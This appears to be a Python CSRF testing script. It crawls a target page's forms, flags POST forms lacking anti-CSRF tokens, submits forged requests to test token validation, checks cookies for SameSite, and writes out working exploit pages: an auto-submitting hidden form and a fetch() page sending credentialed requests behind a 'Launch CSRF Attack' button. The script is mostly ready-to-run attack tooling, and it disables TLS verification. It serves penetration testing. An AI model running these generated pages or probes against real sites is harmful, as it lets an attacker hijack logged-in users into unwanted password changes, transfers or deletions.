#!/usr/bin/env python3
"""
CSRF (Cross-Site Request Forgery) Testing Tool
Includes automatic PoC generator
"""

import requests
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import json

urllib3.disable_warnings()

class CSRFTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
    def test_csrf_protection(self, url):
        """Test CSRF protection mechanisms"""
        print(f"\n[*] Testing CSRF protection on: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            vulnerabilities = []
            
            for idx, form in enumerate(forms):
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(url, form_action)
                
                print(f"\n[*] Analyzing Form #{idx + 1}")
                print(f"    Action: {form_action}")
                print(f"    Method: {form_method}")
                
                # Collect form data
                form_data = {}
                inputs = form.find_all('input')
                
                csrf_token_found = False
                csrf_field_name = None
                
                # Common CSRF token field names
                csrf_patterns = [
                    'csrf', 'token', '_token', 'csrf_token', 
                    'authenticity_token', 'anti_csrf', 'xsrf',
                    '_csrf', 'csrfmiddlewaretoken'
                ]
                
                for input_tag in inputs:
                    input_name = input_tag.get('name', '')
                    input_type = input_tag.get('type', 'text')
                    input_value = input_tag.get('value', '')
                    
                    form_data[input_name] = input_value
                    
                    # Check for CSRF token
                    if any(pattern in input_name.lower() for pattern in csrf_patterns):
                        csrf_token_found = True
                        csrf_field_name = input_name
                        print(f"    [+] CSRF token found: {input_name}")
                
                # Check for sensitive operations
                sensitive_keywords = [
                    'delete', 'remove', 'update', 'change', 'transfer',
                    'password', 'email', 'withdraw', 'payment', 'purchase'
                ]
                
                form_html = str(form).lower()
                form_sensitive = any(keyword in form_html for keyword in sensitive_keywords)
                
                # Vulnerability assessment
                if form_method == 'post' and not csrf_token_found:
                    severity = 'CRITICAL' if form_sensitive else 'HIGH'
                    
                    vuln = {
                        'form_id': idx + 1,
                        'url': form_url,
                        'method': form_method,
                        'csrf_protected': False,
                        'sensitive_operation': form_sensitive,
                        'severity': severity,
                        'form_data': form_data
                    }
                    
                    vulnerabilities.append(vuln)
                    
                    print(f"    [!] VULNERABLE - No CSRF protection")
                    print(f"    [!] Severity: {severity}")
                    
                    if form_sensitive:
                        print(f"    [!] Sensitive operation detected!")
                    
                    # Generate PoC
                    self.generate_csrf_poc(vuln, url)
                
                elif csrf_token_found:
                    print(f"    [+] CSRF protection appears to be in place")
                    
                    # Test if token is validated
                    print(f"    [*] Testing token validation...")
                    is_validated = self.test_csrf_token_validation(
                        form_url, form_method, form_data, csrf_field_name
                    )
                    
                    if not is_validated:
                        vuln = {
                            'form_id': idx + 1,
                            'url': form_url,
                            'method': form_method,
                            'csrf_protected': True,
                            'token_validated': False,
                            'severity': 'HIGH',
                            'form_data': form_data
                        }
                        vulnerabilities.append(vuln)
                        print(f"    [!] VULNERABLE - CSRF token not properly validated!")
            
            return vulnerabilities
        
        except Exception as e:
            print(f"[!] Error: {e}")
            return []
    
    def test_csrf_token_validation(self, url, method, form_data, csrf_field):
        """Test if CSRF token is actually validated"""
        
        # Test 1: Submit with invalid token
        test_data = form_data.copy()
        test_data[csrf_field] = 'invalid_token_12345'
        
        try:
            if method == 'post':
                response = self.session.post(url, data=test_data, timeout=10)
            else:
                response = self.session.get(url, params=test_data, timeout=10)
            
            # If request succeeds with invalid token, it's not validated
            if response.status_code in [200, 302]:
                error_keywords = ['invalid', 'token', 'csrf', 'forbidden', 'error']
                if not any(keyword in response.text.lower() for keyword in error_keywords):
                    return False  # Token not validated
            
            # Test 2: Submit without token
            test_data2 = form_data.copy()
            if csrf_field in test_data2:
                del test_data2[csrf_field]
            
            if method == 'post':
                response2 = self.session.post(url, data=test_data2, timeout=10)
            else:
                response2 = self.session.get(url, params=test_data2, timeout=10)
            
            if response2.status_code in [200, 302]:
                if not any(keyword in response2.text.lower() for keyword in error_keywords):
                    return False  # Token not required
            
            return True  # Token appears to be validated
        
        except Exception as e:
            print(f"    [!] Error testing token validation: {e}")
            return True  # Assume validated if error occurs
    
    def generate_csrf_poc(self, vuln, original_url):
        """Generate CSRF Proof of Concept"""
        print(f"\n    [*] Generating CSRF PoC...")
        
        # HTML PoC
        html_poc = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {vuln['url']}</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This page will automatically submit a CSRF attack to: <code>{vuln['url']}</code></p>
    
    <form id="csrf-form" action="{vuln['url']}" method="{vuln['method'].upper()}">
"""
        
        for field_name, field_value in vuln['form_data'].items():
            if field_name:  # Skip empty field names
                html_poc += f'        <input type="hidden" name="{field_name}" value="{field_value}" />\n'
        
        html_poc += """    </form>
    
    <script>
        // Auto-submit after 2 seconds
        setTimeout(function() {
            document.getElementById('csrf-form').submit();
        }, 2000);
    </script>
    
    <p>Form will be submitted in 2 seconds...</p>
    <p>Or click here: <button onclick="document.getElementById('csrf-form').submit()">Submit</button></p>
</body>
</html>
"""
        
        # Save PoC
        filename = f"csrf_poc_form_{vuln['form_id']}.html"
        with open(filename, 'w') as f:
            f.write(html_poc)
        
        print(f"    [+] PoC saved to: {filename}")
        
        # Generate AJAX PoC
        ajax_poc = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC (AJAX) - {vuln['url']}</title>
</head>
<body>
    <h1>CSRF Proof of Concept (AJAX)</h1>
    <p>Target: <code>{vuln['url']}</code></p>
    
    <button onclick="launchAttack()">Launch CSRF Attack</button>
    <div id="result"></div>
    
    <script>
        function launchAttack() {{
            var formData = new FormData();
"""
        
        for field_name, field_value in vuln['form_data'].items():
            if field_name:
                ajax_poc += f'            formData.append("{field_name}", "{field_value}");\n'
        
        ajax_poc += f"""
            fetch("{vuln['url']}", {{
                method: "{vuln['method'].upper()}",
                body: formData,
                credentials: 'include'
            }})
            .then(response => response.text())
            .then(data => {{
                document.getElementById('result').innerHTML = '<h3>Attack Completed!</h3><pre>' + data.substring(0, 500) + '...</pre>';
            }})
            .catch(error => {{
                document.getElementById('result').innerHTML = '<h3>Error: ' + error + '</h3>';
            }});
        }}
    </script>
</body>
</html>
"""
        
        ajax_filename = f"csrf_poc_ajax_form_{vuln['form_id']}.html"
        with open(ajax_filename, 'w') as f:
            f.write(ajax_poc)
        
        print(f"    [+] AJAX PoC saved to: {ajax_filename}")
        
        return filename
    
    def test_same_site_cookie(self):
        """Test SameSite cookie attribute"""
        print(f"\n[*] Testing SameSite cookie attribute...")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            
            vulnerabilities = []
            
            for cookie in self.session.cookies:
                has_samesite = cookie.has_nonstandard_attr('SameSite')
                
                if not has_samesite:
                    vuln = {
                        'cookie_name': cookie.name,
                        'missing_samesite': True,
                        'severity': 'MEDIUM'
                    }
                    vulnerabilities.append(vuln)
                    
                    print(f"    [!] Cookie '{cookie.name}' missing SameSite attribute")
                    print(f"    [!] This cookie is vulnerable to CSRF attacks")
                else:
                    print(f"    [+] Cookie '{cookie.name}' has SameSite attribute")
            
            return vulnerabilities
        
        except Exception as e:
            print(f"[!] Error: {e}")
            return []
    
    def run_all_tests(self):
        """Run all CSRF tests"""
        print(f"\n{'='*60}")
        print(f"CSRF VULNERABILITY TESTING")
        print(f"Target: {self.target_url}")
        print(f"{'='*60}")
        
        # Test CSRF protection
        form_vulnerabilities = self.test_csrf_protection(self.target_url)
        
        # Test SameSite cookies
        cookie_vulnerabilities = self.test_same_site_cookie()
        
        # Summary
        print(f"\n{'='*60}")
        print("SUMMARY")
        print(f"{'='*60}")
        print(f"Vulnerable Forms: {len(form_vulnerabilities)}")
        print(f"Vulnerable Cookies: {len(cookie_vulnerabilities)}")
        
        if form_vulnerabilities:
            print(f"\n[!] CSRF vulnerabilities found in {len(form_vulnerabilities)} form(s)")
            for vuln in form_vulnerabilities:
                print(f"    - Form #{vuln['form_id']}: {vuln['url']} [{vuln['severity']}]")
        
        if cookie_vulnerabilities:
            print(f"\n[!] Cookies without SameSite attribute:")
            for vuln in cookie_vulnerabilities:
                print(f"    - {vuln['cookie_name']}")
        
        return {
            'forms': form_vulnerabilities,
            'cookies': cookie_vulnerabilities
        }


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 csrf_tester.py <url>")
        print("Example: python3 csrf_tester.py http://localhost/admin/profile.php")
        sys.exit(1)
    
    url = sys.argv[1]
    
    tester = CSRFTester(url)
    tester.run_all_tests()
